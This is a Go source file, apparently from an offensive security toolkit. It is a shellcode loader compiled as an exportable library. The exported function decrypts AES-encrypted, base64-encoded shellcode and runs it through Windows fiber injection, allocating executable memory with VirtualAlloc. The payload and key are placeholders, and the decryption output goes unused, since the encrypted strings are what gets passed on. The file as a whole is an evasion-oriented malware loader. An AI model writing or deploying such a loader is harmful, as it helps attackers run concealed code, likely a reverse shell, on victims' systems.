package main

import "C"
import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"syscall"

	shellcode "github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/fibers"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	ntdll                    = syscall.NewLazyDLL("ntdll.dll")
	procCreateFiber          = kernel32.NewProc("CreateFiber")
	procConvertThreadToFiber = kernel32.NewProc("ConvertThreadToFiber")
	procSwitchToFiber        = kernel32.NewProc("SwitchToFiber")
	procGetLastError         = kernel32.NewProc("GetLastError")
	procVirtualAlloc         = kernel32.NewProc("VirtualAlloc")
	procRtlCopyMemory        = ntdll.NewProc("RtlCopyMemory")
	Shellcode                = "<SHELLCODE ENCRYPTED AND BASE64-ENCODED>"
	Password                 = "<KEY BASE64-ENCODED>"
)

//export execRev
func execRev() {

	ciphertext, _ := base64.StdEncoding.DecodeString(Shellcode)
	key, _ := base64.StdEncoding.DecodeString(Password)
	block, _ := aes.NewCipher(key)
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(plaintext, ciphertext)

	shellcode.ShellcodeFibers(Shellcode, Password)

}

func main() {
	//Blank
}
